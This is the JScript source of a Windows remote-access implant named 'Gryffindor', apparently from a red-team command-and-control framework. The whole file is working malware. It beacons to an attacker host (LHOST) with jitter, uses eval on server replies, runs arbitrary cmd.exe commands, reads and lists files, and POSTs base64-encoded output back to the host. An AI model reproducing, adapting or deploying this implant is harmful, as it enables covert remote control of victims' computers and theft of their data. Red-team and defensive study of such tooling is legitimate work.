//#######################
//   GLOBAL VARIABLES
//#######################
var curcmd = "";
var serverMsg = "";
var c2url = "http://" + LHOST;
var objShell = new ActiveXObject("WScript.Shell");
var xFrameOptions = "SAMEORIGIN";
var contentEncoding = "gzip";
var contentType = "text/xml";
var agentid = Math.floor(Math.random() * 99999999).toString();

//Remove hardcoded vars
//agentid = "244633367";
//WScript.Echo(agentid);

var target = c2url + uri;
var initcmd = "";

//#######################
//   FUNCTIONS
//#######################
function webRequest(target) {
  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
    WinHttpReq.Open("GET", target, false);
    //  Send the HTTP request.
    WinHttpReq.Send();
    // Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //  Retrieve the response text.
    res = WinHttpReq.ResponseText;
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " +
        (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }
  return res;
}
function webPost(target, cmdResponse) {
  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
    WinHttpReq.Open("POST", target, false);

    // Set HTTP Headers
    WinHttpReq.setRequestHeader("User-Agent", useragent);
    WinHttpReq.setRequestHeader("X-Frame-Options", xFrameOptions);
    WinHttpReq.setRequestHeader("Content-Type", contentType);

    //  Send the HTTP request.
    WinHttpReq.Send(cmdResponse);
    // Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //  Retrieve the response text.
    res = WinHttpReq.ResponseText;
    //WScript.Echo(res);
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " +
        (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }
  return res;
}
function browserInject() {
  //Load React-Gryffindor into the browser's homepage and instantiate
  //var c2url = "http://10.0.0.189/";
  var ieShell = new ActiveXObject("WScript.Shell");
  //ieShell.Run("C:\\Program Files\\Internet Explorer\\iexplore.exe");
  ieShell.Run("\"C:\\Program Files\\Internet Explorer\\IExplore.exe\"" + c2url, 2);
  WScript.Sleep(3000);
}
function execCommand() {
  WScript.Sleep(3000);
}
function base64Encode(data) {
   var xml = WScript.CreateObject("MSXml2.DOMDocument");
   var element = xml.createElement("Base64Data");
   element.dataType = "bin.base64";
   element.nodeTypedValue = streamStringToBinary(data);

   return element.text.replace(/\n/g, "");
}
function streamStringToBinary(data) {
   var inputStream = WScript.CreateObject("ADODB.Stream");
   inputStream.Type = 2;
   inputStream.CharSet = "us-ascii";
   inputStream.Open();
   inputStream.WriteText(data);

   //Change stream to binary
   inputStream.Position = 0;
   inputStream.Type = 1;
   inputStream.Position = 0;

   var streamData = inputStream.Read();
   inputStream.Close();
   return streamData;
}
//#######################
//   MAIN EXECUTION
//#######################
var pwd = "c:"
var running = true

while(running == true)
{
  var b = '{"type":"b","agentid": ' + agentid +'}';
  var serverMsg = webPost(target, b);
  var jsondata = "{" + serverMsg.split("{")[1]

  //Add Jitter
  //Jitter mod is based on previous could drift over time...
  if (Math.floor(Math.random() * 10) % 2 == 0) {
    beaconTime = beaconTime + (beaconTime * (jitter/100));
  } else {
    beaconTime = beaconTime - (beaconTime * (jitter/100));
  }

   //Check for binject
   //if not then go direct
   //WScript.Echo(curcmd)
   //WScript.Echo(jsondata)
   //execution
  try
  {
    //Dangerous eval on unsanitized data here
    eval("jsObject="+jsondata);

    //If New command
    if (curcmd != jsObject._id) {

      var retval = "";


      //Command Selector
      if (jsObject.cmd == "help") {

        var retval = "===========================\n";
        var retval = retval + "Gryffindor Commands:\n";
        var retval = retval + "===========================\n";
        var retval = retval + "help - Show this information\n";
        var retval = retval + "pwd - Print payload working directory\n";
        var retval = retval + "cat - Show file contents\n";
        var retval = retval + "type - Show file contents\n";
        var retval = retval + "cd - Change directory\n";
        var retval = retval + "ls - Show directory contents\n";
        var retval = retval + "dir - Show directory contents\n";
        var retval = retval + "set - Apply payload configuration modification\n";
        var retval = retval + "type - \n";
        var retval = retval + "Other commands sent to Gryffindor are executed in the Windows cmd.exe shell.\n";
        var retval = retval + "===========================\n";

      } else if (jsObject.cmd == "pwd") {
        var retval = pwd;
      } else if (jsObject.cmd.split(" ")[0] == "cd") {

        if (jsObject.cmd.split(" ")[1] == "..") {
          depth = pwd.split("\\").length - 1
          fso = new ActiveXObject("Scripting.FileSystemObject");
          pwd = fso.GetParentFolderName(pwd);

        } else {
          pwd = pwd + "\\" + jsObject.cmd.slice(3);
        }
      } else if (jsObject.cmd.split(" ")[0] == "type" || jsObject.cmd.split(" ")[0] == "cat") {
        //Do shell command
        var execStatus = objShell.Exec("type " + pwd + "\\" + jsObject.cmd.split(" ")[1]);

        if (execStatus.status == 2) {
           retval = execStatus.StdErr.ReadAll();
        } else {
           retval = execStatus.StdOut.ReadAll();
        }
      } else if (jsObject.cmd.split(" ")[0] == "dir" || jsObject.cmd.split(" ")[0] == "ls") {
        //Do shell command
        if (jsObject.cmd.split(" ")[1]) {
          var fso, f, fc, s;
          fso = new ActiveXObject("Scripting.FileSystemObject");

          f = fso.GetFolder(pwd + "\\" + jsObject.cmd.split(" ")[1]);

          fc = new Enumerator(f.files);
          s = "";
          for (; !fc.atEnd(); fc.moveNext()) {
            s += fc.item();
            s += "\n";
          }
          fc = new Enumerator(f.SubFolders);
          for (; !fc.atEnd(); fc.moveNext()) {
            s += fc.item().path;
            s += "\n";
          }
          retval = s;
        } else {
          var fso, f, fc, s;
          fso = new ActiveXObject("Scripting.FileSystemObject");

          f = fso.GetFolder(pwd + "\\");

          fc = new Enumerator(f.files);
          s = "";
          for (; !fc.atEnd(); fc.moveNext()) {
            s += fc.item();
            s += "\n";
          }
          fc = new Enumerator(f.SubFolders);
          for (; !fc.atEnd(); fc.moveNext()) {
            s += fc.item().path;
            s += "\n";
          }
          retval = s;
        }
      } else if (jsObject.cmd.split(" ")[0] == "set") {
        var mod = jsObject.cmd.slice(4);

        if (mod.split(" ")[0] == "interval") {
          beaconTime = parseInt(mod.split(" ")[1], 10) * 1000
          retval = "Modifying implant beaconing interval to: " + beaconTime + "ms"
        }

      } else if (jsObject.cmd.split(" ")[0] == "show") {
        var mod = jsObject.cmd.slice(5);

        if (mod.split(" ")[0] == "settings") {
          var retval = retval + "Interval: " + beaconTime + "\n";
          var retval = retval + "Jitter: " + "10% \n";
          var retval = retval + "RHOST: " + LHOST + "\n";
          var retval = retval + "\n";
        }

      } else if (jsObject.cmd == "die" || jsObject.cmd == "kill") {
        var running = false;


      //Additional Command Templates



      } else if (jsObject.cmd == "help") {
        var retval = "chuck testa";
      } else if (jsObject.cmd == "help") {
        var retval = "chuck testa";
      } else {
        //Do shell command
        var execStatus = objShell.Exec(jsObject.cmd);

        if (execStatus.status == 2) {
           retval = execStatus.StdErr.ReadAll();
        } else {
           retval = execStatus.StdOut.ReadAll();
        }
      }

      var resp = '{"type":"r","agentid": ' + agentid + ',"taskid":"1","cmd":"' + jsObject.cmd + '","retval":"' + base64Encode(retval) + '"}';

      curcmd = jsObject._id;
      //WScript.Echo(beaconTime);
      webPost(target, resp);
    }
  }
  catch (e)
  {
     WScript.Sleep(beaconTime);
  }
  WScript.Echo(beaconTime);
  WScript.Sleep(beaconTime);
}
